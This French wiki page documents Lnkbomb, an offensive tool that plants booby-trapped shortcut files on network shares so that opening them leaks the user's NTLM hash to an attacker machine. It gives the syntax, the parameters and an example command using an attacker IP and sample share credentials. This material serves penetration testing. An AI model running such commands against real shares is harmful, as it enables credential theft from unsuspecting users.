---
title: Lnkbomb
description: Transfère automatiquement des fichiers raccourcis piégés (.lnk) vers des partages de fichiers. Permet de récupérer le hash NTLM de l'utilisateur quand il essaie d'accéder au raccourci.
published: true
date: 2025-05-04T14:53:46.040Z
tags: outil, windows
editor: markdown
dateCreated: 2024-10-26T08:26:41.495Z
---

# Introduction

Lnkbomb permet de transférer automatiquement des fichiers raccourcis piégés (.url) vers des partages de fichiers. Permet de récupérer le hash NTLM de l'utilisateur quand il essaie d'accéder au raccourci.

La base de l'exploitation repose sur le fait de définir l'icone du raccourci vers le serveur d'un attaquant. En cliquant sur le raccourci, l'utilisateur va essayer de s'authentifier au serveur pour récupèrer cette icône.

> Lnkbomb est disponible au téléchargement [ici](https://github.com/dievus/lnkbomb)
> {.is-info}

# Syntaxe

`lnkbomb.py --target <adresse du partage cible> --attacker <adresse de la machine attaquante> -s <nom du partage> <--windows|--linux> [--netbios <nom netbios>] [paramètres]`

# Paramètres

| Paramètre                                                   | Description                                                                               |
| ----------------------------------------------------------- | ----------------------------------------------------------------------------------------- |
| `-h, --help`                                                | Affiche l'aide.                                                                           |
| `-t, --target`                                              | Spécifie l'adresse de la cible contenant le partage où déposer le fichier raccourci .url. |
| `-a, --attacker`                                            | Spécifie l'adresse de la machine attaquante vers laquelle renvoyer l'utilisateur.         |
| `-r <nom de fichier .url>, --recover <nom de fichier .url>` | Supprime le fichier spécifié raccourci .url sur le partage.                               |
| `-w, --windows`                                             | Utilise les ports associés à Windows.                                                     |
| `-l, --linux`                                               | Utilise les ports associés à Linux.                                                       |
| `-n <nom netbios>, --netbios <nom netbios>`                 | Spécifie le nom netbios de la cible. Obligatoire pour Windows.                            |

# Exemples

Créer un fichier piégé .url avec comme emplacement d'icone 192.168.1.100. Situé sur \\192.168.1.1\MonPartage, sur une machine Windows nommée "serveurpartage". S'authentifie au partage avec l'utilisateur Admin et le mot de passe "MotDePasseAdmin!".

`lnkbomb.py -t 192.168.1.1 -a 192.168.1.100 -s MonPartage -u Admin -p MotDePasseAdmin! -n serveurpartage --windows`
